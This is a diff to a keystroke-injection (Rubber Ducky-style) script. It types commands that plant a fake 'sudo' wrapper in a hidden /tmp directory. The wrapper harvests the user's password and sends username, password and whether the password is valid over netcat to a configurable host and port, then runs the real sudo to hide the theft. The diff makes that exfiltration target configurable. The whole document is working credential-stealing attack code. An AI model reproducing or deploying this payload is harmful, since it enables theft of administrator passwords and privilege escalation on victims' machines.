@@ -10,14 +10,24 @@ REM STRING terminal
 REM ENTER
 REM DELAY 3000
 
+REM ********** Clear existing files
 STRING rm -rf /tmp/.config
 ENTER
 DELAY 100
 STRING mkdir -p /tmp/.config/sudo
 ENTER
 DELAY 100
+
+
 STRING echo '#!'$SHELL > /tmp/.config/sudo/sudo
 ENTER
+
+REM Set some env vars
+STRING echo 'export HOST=localhost' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'export PORT=1337' >> /tmp/.config/sudo/sudo
+ENTER
+
 STRING echo '/usr/bin/sudo -n true 2>/dev/null' >> /tmp/.config/sudo/sudo
 ENTER
 STRING echo 'if [ $? -eq 0 ]' >> /tmp/.config/sudo/sudo
@@ -40,13 +50,13 @@ STRING echo 'if [ $? -eq 1 ]' >> /tmp/.config/sudo/sudo
 ENTER
 STRING echo 'then' >> /tmp/.config/sudo/sudo
 ENTER
-STRING echo 'echo "$USER:$pwd:invalid" | nc -N localhost 1337' >> /tmp/.config/sudo/sudo
+STRING echo 'echo "$USER:$pwd:invalid" | nc -N $HOST $PORT' >> /tmp/.config/sudo/sudo
 ENTER
 STRING echo 'sudo $@' >> /tmp/.config/sudo/sudo
 ENTER
 STRING echo 'else' >> /tmp/.config/sudo/sudo
 ENTER
-STRING echo 'echo "$USER:$pwd:valid" | nc -N localhost 1337' >> /tmp/.config/sudo/sudo
+STRING echo 'echo "$USER:$pwd:valid" | nc -N $HOST $PORT' >> /tmp/.config/sudo/sudo
 ENTER
 STRING echo 'echo "$pwd" | /usr/bin/sudo -S $@' >> /tmp/.config/sudo/sudo
 ENTER
